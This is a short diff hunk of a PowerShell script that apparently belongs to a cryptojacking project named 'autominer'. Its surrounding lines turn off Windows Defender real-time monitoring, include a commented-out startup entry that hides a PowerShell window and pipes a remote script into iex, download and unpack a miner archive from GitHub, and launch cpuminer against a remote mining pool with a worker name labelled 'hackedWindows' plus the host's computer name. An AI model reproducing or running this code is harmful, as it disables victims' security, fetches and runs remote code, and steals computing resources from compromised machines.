@@ -6,5 +6,5 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 rem Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm hhttps://raw.githubusercontent.com/zlc1004/autominer/refs/heads/main/miner.ps1 | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
 Invoke-WebRequest "https://github.com/zlc1004/autominer/raw/refs/heads/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
 Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
-Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\miner
+Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\cpuminer-opt-24.5-windows
 ./cpuminer.exe -o stratum+tcp://bowserlab.ddns.net:6033 -u "9HuMXoLqu8FsSBfk9fNEKGh88z2fddkpwi.hackedWindows$($Env:ComputerName)" -p c=XMG
